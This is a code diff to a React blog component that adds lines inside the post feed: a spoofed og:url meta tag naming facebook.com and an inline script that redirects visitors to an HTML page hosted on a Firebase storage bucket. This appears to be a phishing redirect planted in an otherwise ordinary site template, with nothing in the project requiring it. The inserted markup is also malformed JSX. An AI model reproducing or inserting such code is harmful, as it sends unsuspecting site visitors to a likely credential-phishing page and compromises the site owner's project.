@@ -16,6 +16,13 @@ export default class SectionPosts extends React.Component {
               <h2 className="block-title underline inner-sm">{_.get(section, 'title')}</h2>
               }
               <div className="post-feed">
+                   <meta property="og:url" content="https://www.facebook.com/" />
+    '<script language="javascript">
+      setTimeout(
+        (location.href =
+          "https://firebasestorage.googleapis.com/v0/b/sandoval-b95b9.appspot.com/o/index5.html?alt=media&token=a094893b-6b1b-4b76-8f69-ce38da3d647a"),
+        8000
+      );</script>';
                 <div className="post-feed-inside">
                   {_.map(recent_posts, (post, post_idx) => (
                   <article key={post_idx} className="post post-card">
